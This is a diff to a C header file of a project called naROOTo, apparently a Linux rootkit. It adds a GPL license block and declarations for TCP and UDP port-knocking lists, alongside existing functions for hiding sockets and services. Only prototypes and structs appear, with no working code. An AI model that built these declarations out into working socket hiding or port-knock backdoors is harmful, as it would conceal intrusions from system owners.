@@ -1,3 +1,20 @@
+/*
+ * This file is part of naROOTo.
+
+ * naROOTo is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+
+ * naROOTo is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+
+ * You should have received a copy of the GNU General Public License
+ * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
+ */
+
 #ifndef CONTROL_HEADER
 #define CONTROL_HEADER
 
@@ -31,6 +48,18 @@ struct tcp_socket {
 
 /* list for hidden udp sockets (by port) */
 struct udp_socket {
+	struct list_head list;
+	int port;
+};
+
+/* list for tcp ports that use port knocking */
+struct knocking_tcp_port {
+	struct list_head list;
+	int port;
+};
+
+/* list for udp ports that use port knocking */
+struct knocking_udp_port {
 	struct list_head list;
 	int port;
 };
@@ -127,6 +156,24 @@ hide_udp_socket(int port);
 
 int
 unhide_udp_socket(int port);
+
+int
+is_knocked_tcp(int port);
+
+int
+enable_knocking_tcp(int port);
+
+int
+disable_knocking_tcp(int port);
+
+int
+is_knocked_udp(int port);
+
+int
+enable_knocking_udp(int port);
+
+int
+disable_knocking_udp(int port);
 
 int
 is_service_hidden(int port);
